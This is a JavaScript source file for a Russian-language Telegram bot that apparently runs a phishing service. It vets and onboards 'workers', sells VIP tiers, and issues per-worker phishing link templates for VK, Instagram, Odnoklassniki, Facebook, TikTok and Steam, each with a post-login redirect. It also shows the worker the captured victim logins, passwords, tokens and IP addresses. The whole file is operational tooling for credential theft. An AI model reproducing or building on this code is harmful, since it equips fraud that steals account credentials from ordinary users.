const bot = require('./createBot')
const StringDate = require('./server/tools').GetStringDate
const ReplayList = require('./server/tools').CreateReplayList
const data = require('./database/models/userData')
const account = require('./database/models/account')
const link = require('./database/models/link')
const {
    names,
    links,
    emptyString,
    ReplayListAccs,
    ReplayListLinks,
    vip,
    Menu
} = require('./objects')
async function ShowLinks(callbackQuery) {
    const links = await link.find({
        tg_id: callbackQuery.message.chat.id,
        type: callbackQuery.data.split('_')[1]
    })
    if (links.length > 0) {
        let btnArray = []
        links.map(link => {
            btnArray[btnArray.length] = [{
                text: link.link,
                callback_data: 'showLinkInfo' + '_' + link._id
            }]
        })
        btnArray[btnArray.length] = [{
            text: 'Назад',
            callback_data: 'showLinksMenu'
        }]
        bot.editMessageText(`Выберите одну из ссылок ниже`, {
            chat_id: callbackQuery.message.chat.id,
            message_id: callbackQuery.message.message_id,
            reply_markup: {
                inline_keyboard: btnArray
            },
            parse_mode: 'HTML'
        })
    } else {
        bot.editMessageText(`К сожалению в данный момент у нас нет ссылок для этого сервиса`, {
            chat_id: callbackQuery.message.chat.id,
            message_id: callbackQuery.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Назад',
                        callback_data: 'showLinksMenu'
                    }]
                ]
            },
            parse_mode: 'HTML'
        })
    }
}
async function ShowLinkInfo(callbackQuery) {
    const links = await link.findById({
        _id: callbackQuery.data.split('_')[1]
    }).catch(err => {})
    let c = 0
    bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id)
    bot.sendPhoto(callbackQuery.message.chat.id, links.query[c].image, {
        caption: `Шаблон #${c+1} [${links.query[c].name}]\n\n${links.query[c].description}\n\nВаша ссылка: <code>${links.link}/${callbackQuery.message.chat.id.toString(32)}?${c}</code>\n\n\🚪 Переход после авторизации: <code>${links.query[c].redirect}</code>`,
        reply_markup: {
            inline_keyboard: [
                links.query[c + 1] ? [{
                    text: '➡️',
                    callback_data: `showNextLinkQuery_${links._id}_${c}`
                }] : []

            ]
        },
        parse_mode: 'HTML'
    }).catch(err => {
        bot.sendMessage(msg.chat.id, '(Image Error)К сожалению у нас произошла ошибка, пожалуйста обратитесь к администратору')
    })
}
async function showPrevLink(callbackQuery) {
    const links = await link.findById({
        _id: callbackQuery.data.split('_')[1]
    })
    let c = Number(callbackQuery.data.split('_')[2]) - 1
    await bot.editMessageMedia({
        media: links.query[c].image,
        type: 'photo'
    }, {
        chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        parse_mode: 'HTML'

    })
    await bot.editMessageCaption(`Шаблон #${c+1} [${links.query[c].name}]\n\n${links.query[c].description}\n\nВаша ссылка: <code>${links.link}/${callbackQuery.message.chat.id.toString(32)}?${c}</code>\n\n\🚪 Переход после авторизации: <code>${links.query[c].redirect}</code>`, {
        chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        reply_markup: {
            inline_keyboard: [
                (links.query[c - 1] ? [{
                    text: '⬅️',
                    callback_data: `showPrevLinkQuery_${links._id}_${c}`
                }, {
                    text: '➡️',
                    callback_data: `showNextLinkQuery_${links._id}_${c}`
                }] : [{
                    text: '➡️',
                    callback_data: `showNextLinkQuery_${links._id}_${c}`
                }]),
                //[{text: 'Изменить ссылку после авторизации', callback_data:`changeUrl_${links._id}_${c}`}]
            ]
        },
        parse_mode: 'HTML',
    })
}
async function showNextLink(callbackQuery) {
    const links = await link.findById({
        _id: callbackQuery.data.split('_')[1]
    })
    let c = Number(callbackQuery.data.split('_')[2]) + 1
    await bot.editMessageMedia({
        media: links.query[c].image,
        type: 'photo'
    }, {
        chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        parse_mode: 'HTML'

    })
    await bot.editMessageCaption(`Шаблон #${c+1} [${links.query[c].name}]\n\n${links.query[c].description}\n\nВаша ссылка: <code>${links.link}/${callbackQuery.message.chat.id.toString(32)}?${c}</code>\n\n\🚪 Переход после авторизации: <code>${links.query[c].redirect}</code>`, {
        chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        reply_markup: {
            inline_keyboard: [
                (links.query[c + 1] ? [{
                    text: '⬅️',
                    callback_data: `showPrevLinkQuery_${links._id}_${c}`
                }, {
                    text: '➡️',
                    callback_data: `showNextLinkQuery_${links._id}_${c}`
                }] : [{
                    text: '⬅️',
                    callback_data: `showPrevLinkQuery_${links._id}_${c}`
                }]),
                // [{
                //     text: 'Изменить ссылку после авторизации',
                //     callback_data: `changeUrl_${links._id}_${c}`
                // }]
            ]
        },
        parse_mode: 'HTML',
    })
}
async function NextAccount(callbackQuery) {
    const accounts = await account.find({
        tg_id: callbackQuery.message.chat.id,
        type: callbackQuery.data.split('_')[1]
    })
    accounts.reverse()
    let c = Number(callbackQuery.data.split('_')[2]) + 1
    let type = callbackQuery.data.split('_')[1]
    bot.editMessageText(type == 'vk' ? `Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n🖇  Token: <code>${accounts[c].token||'-'}</code>\n\n🆔 ID:${accounts[c].id||'-'}\n\n🤼 Друзей: ${accounts[c].friends||'-'}\n👨‍👩‍👧‍👦 Подписчиков: ${accounts[c].friends||'-'}\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]` : `Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
        chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        reply_markup: {
            inline_keyboard: [
                accounts[c + 1] ? [{
                    text: '⬅️',
                    callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
                }, {
                    text: '➡️',
                    callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
                }] : [{
                    text: '⬅️',
                    callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
                }],
            ]
        },
        parse_mode: 'HTML'
    })
}
async function PreviousAccount(callbackQuery) {
    const accounts = await account.find({
        tg_id: callbackQuery.message.chat.id,
        type: callbackQuery.data.split('_')[1]
    })
    accounts.reverse()
    let c = Number(callbackQuery.data.split('_')[2]) - 1
    let type = callbackQuery.data.split('_')[1]
    bot.editMessageText(type == 'vk' ? `Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n🖇  Token: <code>${accounts[c].token||'-'}</code>\n\n🆔 ID:${accounts[c].id||'-'}\n\n🤼 Друзей: ${accounts[c].friends||'-'}\n👨‍👩‍👧‍👦 Подписчиков: ${accounts[c].friends||'-'}\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]` : `Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
        chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        reply_markup: {
            inline_keyboard: [
                accounts[c - 1] ? [{
                    text: '⬅️',
                    callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
                }, {
                    text: '➡️',
                    callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
                }] : [{
                    text: '➡️',
                    callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
                }],
            ]
        },
        parse_mode: 'HTML'
    })
}
async function ShowAccounts(callbackQuery) {
    const accounts = await account.find({
        tg_id: callbackQuery.message.chat.id,
        type: callbackQuery.data.split('_')[1]
    })
    accounts.reverse()
    let c = 0
    let type = callbackQuery.data.split('_')[1]
    if (accounts.length > 0) {
        bot.editMessageText(type == 'vk' ? `Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n🖇  Token: <code>${accounts[c].token||'-'}</code>\n\n🆔 ID:${accounts[c].id||'-'}\n\n🤼 Друзей: ${accounts[c].friends||'-'}\n👨‍👩‍👧‍👦 Подписчиков: ${accounts[c].friends||'-'}\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]` : `Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
            chat_id: callbackQuery.message.chat.id,
            message_id: callbackQuery.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    accounts[c + 1] ? [{
                        text: '➡️',
                        callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
                    }] : [],
                ]
            },
            parse_mode: 'HTML'
        })
    } else {
        bot.editMessageText(`🚫 У вас нет аккаунтов ${names[type]}`, {
            chat_id: callbackQuery.message.chat.id,
            message_id: callbackQuery.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Назад',
                        callback_data: `showAccs_all`
                    }],
                ]
            },
            parse_mode: 'HTML'
        })
    }

}
bot.on("callback_query", async (callbackQuery) => {
    const msg = callbackQuery.message;
    if (callbackQuery.data.split('_')[0] == 'experiance') {
        bot.deleteMessage(msg.chat.id, msg.message_id)
        if (callbackQuery.data.split('_')[1] == 'true') {
            await data.updateOne({
                tg_id: msg.chat.id
            }, {
                expirience: 'Да'
            }, {
                upsert: true
            })
        } else {
            await data.updateOne({
                tg_id: msg.chat.id
            }, {
                expirience: 'Нет'
            }, {
                upsert: true
            })
        }
        bot.sendMessage(msg.chat.id, '2. Откуда узнали о нашем проекте', {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Реклама",
                        callback_data: "from_ad"
                    }, {
                        text: "От друзей",
                        callback_data: "from_friend"
                    }],
                    [{
                        text: "Другое",
                        callback_data: "from_other"
                    }]
                ]
            }
        })
    }
    if (callbackQuery.data.split('_')[0] == 'from') {
        bot.deleteMessage(msg.chat.id, msg.message_id)
        if (callbackQuery.data.split('_')[1] == 'ad') {
            await data.updateOne({
                tg_id: msg.chat.id
            }, {
                from: 'Реклама'
            }, {
                upsert: true
            })
        } else if (callbackQuery.data.split('_')[1] == 'friend') {
            await data.updateOne({
                tg_id: msg.chat.id
            }, {
                from: 'От друзей'
            }, {
                upsert: true
            })
        } else {
            await data.updateOne({
                tg_id: msg.chat.id
            }, {
                from: 'Другое'
            }, {
                upsert: true
            })
        }
        bot.sendMessage(msg.chat.id, 'Спасибо за ответы, перед тем как пользоваться сервисом обязательно прочитайте правила', {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "📄 Правила",
                        url: "https://t.me/snifer_rules"
                    }],
                    [{
                        text: "✅ Я прочитал",
                        callback_data: "rules_true"
                    }]
                ]
            }
        })
    }
    if (callbackQuery.data.split('_')[0] == 'rules') {
        bot.deleteMessage(msg.chat.id, msg.message_id)
        const condidate = await data.findOne({
            tg_id: msg.chat.id
        })
        bot.sendMessage(process.env.NotifyGroup, `💣<b>Новая заявка!</b>\n🆔TG id: ${msg.chat.id}\n♦️Пользователь: @${msg.chat.username}\n🏅Опыт: <i>${condidate.expirience}</i>\n🗣Откуда узнали: <i>${condidate.from}</i>\n⚖️Статус заявки: <b>Необходимо обработать </b>`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "✅ Принять",
                        callback_data: `accept_${msg.chat.id}`
                    }],
                    [{
                        text: "❌ Отклонить",
                        callback_data: `reject_${msg.chat.id}`
                    }]
                ]
            },
            parse_mode: "HTML"
        })
        bot.sendMessage(msg.chat.id, 'Ваша заявка успешно отправлена, в ближайшее время вы получите ответ.', {
            reply_markup: {
                keyboard: [
                    ["Написать админу"]
                ],
                resize_keyboard: true,
            }
        })
    }
    if (callbackQuery.data.split('_')[0] == 'accept') {
        bot.editMessageText(callbackQuery.message.text.substr(0, callbackQuery.message.text.length - 21) + 'Принята', {
            chat_id: msg.chat.id,
            message_id: msg.message_id
        }, {
            reply_markup: {
                inline_keyboard: []
            },
            parse_mode: "HTML"
        })
        await data.updateOne({
            tg_id: callbackQuery.data.split('_')[1]
        }, {
            isAccepted: 'true'
        }, {
            upsert: true
        })
        bot.sendMessage(callbackQuery.data.split('_')[1], 'Поздравляем ваша заявка принята!', {
            reply_markup: {
                keyboard: Menu,
                resize_keyboard: true,
            }
        })
    }
    if (callbackQuery.data.split('_')[0] == 'reject') {
        bot.editMessageText(callbackQuery.message.text.substr(0, callbackQuery.message.text.length - 21) + 'Отклонена', {
            chat_id: msg.chat.id,
            message_id: msg.message_id
        }, {
            reply_markup: {
                inline_keyboard: []
            },
            parse_mode: "HTML"
        })
        await data.updateOne({
            tg_id: callbackQuery.data.split('_')[1]
        }, {
            isAccepted: 'false'
        }, {
            upsert: true
        })
        bot.sendMessage(callbackQuery.data.split('_')[1], `К сожалению ваша заявка не прошла отбор, вы можете попробовать еще раз позже.`, {
            reply_markup: {
                keyboard: [
                    ["Подать заявку"],
                    ["Написать админу"]
                ],
                resize_keyboard: true,
            }
        })
    }
    if (callbackQuery.data == 'show_vip') {
        let vipList = []
        Object.keys(vip).map(e => {
            vipList[vipList.length] = [{
                text: `${vip[Number(e)].name} [${vip[Number(e)].price}₽ - ${vip[Number(e)].duration}дней]`,
                callback_data: `vip_${e}`
            }]
        })
        bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id)
        bot.sendMessage(callbackQuery.message.chat.id, `Выберите один из вариантов`, {
            reply_markup: {
                inline_keyboard: vipList
            }
        })
    }
    if (callbackQuery.data.split('_')[0] == 'vip') {
        let c = Number(callbackQuery.data.split('_')[1])
        bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id)
        bot.sendMessage(msg.chat.id, `<b>${vip[c].name}</b>\n<i>${vip[c].description}</i>\n\n${vip[c].list.join('\n- ')}`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: `Купить VIP за ${vip[c].price}₽`,
                        callback_data: `buy_vip${c}`
                    }]
                ]
            },
            parse_mode: 'HTML'
        })
    }
    if (callbackQuery.data.split('_')[0] == 'buy') {
        let user = await data.findOne({
            tg_id: callbackQuery.message.chat.id
        })
        if (callbackQuery.data.split('_')[1].substr(0, 3) == 'vip') {
            let c = Number(callbackQuery.data.split('_')[1].substr(3))
            if (user.balance >= vip[c].price) {
                let date = user.vip ? new Date(user.vipDate) : new Date()
                date.setDate(date.getDate() + vip[c].duration)
                await data.updateOne({
                    tg_id: callbackQuery.message.chat.id
                }, {
                    balance: user.balance - vip[c].price,
                    vip: true,
                    vipDate: date,
                    vipType: c.toString(),
                }, {
                    upsert: true
                }).catch(err => console.log(err))
                bot.editMessageText(`VIP успешно приобретен\nVIP закончится через ${StringDate(date)}`, {
                    chat_id: callbackQuery.message.chat.id,
                    message_id: callbackQuery.message.message_id
                })
            } else {
                bot.editMessageText('У вас недостсточно средств на балансе, для пополения обратитесь к ' + process.env.Admin, {
                    chat_id: callbackQuery.message.chat.id,
                    message_id: callbackQuery.message.message_id
                })
            }
        }
    }
    if (callbackQuery.data.split('_')[0] == 'prevAcc') {
        PreviousAccount(callbackQuery)
    }
    if (callbackQuery.data.split('_')[0] == 'nextAcc') {
        NextAccount(callbackQuery)
    }
    if (callbackQuery.data.split('_')[0] == 'showAccs') {
        if (callbackQuery.data.split('_')[1] == 'all') {
            bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id)
            bot.sendMessage(msg.chat.id, `👀Пожалуйста выберите тип аккаунтов`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Вконтакте',
                            callback_data: 'showAccs_vk'
                        }, {
                            text: 'Instagram',
                            callback_data: 'showAccs_inst'
                        }],
                        [{
                            text: 'Одноклассники',
                            callback_data: 'showAccs_ok'
                        }, {
                            text: 'Facebook',
                            callback_data: 'showAccs_fb'
                        }],
                        [{
                            text: 'TikTok',
                            callback_data: 'showAccs_tt'
                        }, {
                            text: 'Steam',
                            callback_data: 'showAccs_st'
                        }],
                        [{
                            text: '➡️',
                            callback_data: 'nextAccsReplay_3'
                        }]
                    ]
                }
            })
        } else {
            ShowAccounts(callbackQuery)
        }
    }

    if (callbackQuery.data == 'transactions') {
        bot.answerInlineQuery()
    }
    if (callbackQuery.data.split('_')[0] == 'showLinks') {
        ShowLinks(callbackQuery)
    }
    if (callbackQuery.data.split('_')[0] == 'showLinkInfo') {
        ShowLinkInfo(callbackQuery)
    }
    if (callbackQuery.data.split('_')[0] == 'showNextLinkQuery') {
        showNextLink(callbackQuery)
    }
    if (callbackQuery.data.split('_')[0] == 'showPrevLinkQuery') {
        showPrevLink(callbackQuery)
    }
    if (callbackQuery.data == 'showLinksMenu') {
        bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id)
        bot.sendMessage(msg.chat.id, `Пожалуйста выберите категорию`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Вконтакте',
                        callback_data: 'showLinks_vk'
                    }, {
                        text: 'Instagram',
                        callback_data: 'showLinks_inst'
                    }],
                    [{
                        text: 'Одноклассники',
                        callback_data: 'showLinks_ok'
                    }, {
                        text: 'Facebook',
                        callback_data: 'showLinks_fb'
                    }],
                    [{
                        text: 'TikTok',
                        callback_data: 'showLinks_tt'
                    }, {
                        text: 'Steam',
                        callback_data: 'showLinks_st'
                    }],
                    [{
                        text: '➡️',
                        callback_data: 'nextLinksReplay_3'
                    }]

                ]
            }
        })
    }
    if (callbackQuery.data.split('_')[0] == 'nextLinksReplay') {
        let id = Number(callbackQuery.data.split('_')[1])
        await bot.editMessageText(callbackQuery.message.text, {
            chat_id: callbackQuery.message.chat.id,
            message_id: callbackQuery.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    ReplayListLinks[id] ? ReplayListLinks[id] : [],
                    ReplayListLinks[id + 1] ? ReplayListLinks[id + 1] : [],
                    ReplayListLinks[id + 2] ? ReplayListLinks[id + 2] : [],
                    ReplayListLinks[id + 3] ? [{
                        text: '⬅️',
                        callback_data: 'prevLinksReplay_' + id
                    }, {
                        text: '➡️',
                        callback_data: 'nextLinksReplay_' + Number(id + 3)
                    }] : [{
                        text: '⬅️',
                        callback_data: 'prevLinksReplay_' + id
                    }]
                ]
            }
        }).catch(err => {})
    }
    if (callbackQuery.data.split('_')[0] == 'prevLinksReplay') {
        let id = Number(callbackQuery.data.split('_')[1])
        await bot.editMessageText(callbackQuery.message.text, {
            chat_id: callbackQuery.message.chat.id,
            message_id: callbackQuery.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    ReplayListLinks[id - 3] ? ReplayListLinks[id - 3] : [],
                    ReplayListLinks[id - 2] ? ReplayListLinks[id - 2] : [],
                    ReplayListLinks[id - 1] ? ReplayListLinks[id - 1] : [],
                    ReplayListLinks[id - 4] ? [{
                        text: '⬅️',
                        callback_data: 'prevLinksReplay_' + Number(id - 3)
                    }, {
                        text: '➡️',
                        callback_data: 'nextLinksReplay_' + Number(id)
                    }] : [{
                        text: '➡️',
                        callback_data: 'nextLinksReplay_' + Number(id)
                    }]
                ]
            }
        }).catch(err => {})
    }
    if (callbackQuery.data.split('_')[0] == 'nextAccsReplay') {
        let id = Number(callbackQuery.data.split('_')[1])
        await bot.editMessageText(callbackQuery.message.text, {
            chat_id: callbackQuery.message.chat.id,
            message_id: callbackQuery.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    ReplayListAccs[id] ? ReplayListAccs[id] : [],
                    ReplayListAccs[id + 1] ? ReplayListAccs[id + 1] : [],
                    ReplayListAccs[id + 2] ? ReplayListAccs[id + 2] : [],
                    ReplayListAccs[id + 3] ? [{
                        text: '⬅️',
                        callback_data: 'prevAccsReplay_' + id
                    }, {
                        text: '➡️',
                        callback_data: 'nextAccsReplay_' + Number(id + 3)
                    }] : [{
                        text: '⬅️',
                        callback_data: 'prevAccsReplay_' + id
                    }]
                ]
            }
        }).catch(err => {})
    }
    if (callbackQuery.data.split('_')[0] == 'prevAccsReplay') {
        let id = Number(callbackQuery.data.split('_')[1])
        await bot.editMessageText(callbackQuery.message.text, {
            chat_id: callbackQuery.message.chat.id,
            message_id: callbackQuery.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    ReplayListAccs[id - 3] ? ReplayListAccs[id - 3] : [],
                    ReplayListAccs[id - 2] ? ReplayListAccs[id - 2] : [],
                    ReplayListAccs[id - 1] ? ReplayListAccs[id - 1] : [],
                    ReplayListAccs[id - 4] ? [{
                        text: '⬅️',
                        callback_data: 'prevAccsReplay_' + Number(id - 3)
                    }, {
                        text: '➡️',
                        callback_data: 'nextAccsReplay_' + Number(id)
                    }] : [{
                        text: '➡️',
                        callback_data: 'nextAccsReplay_' + Number(id)
                    }]
                ]
            }
        })
    }
})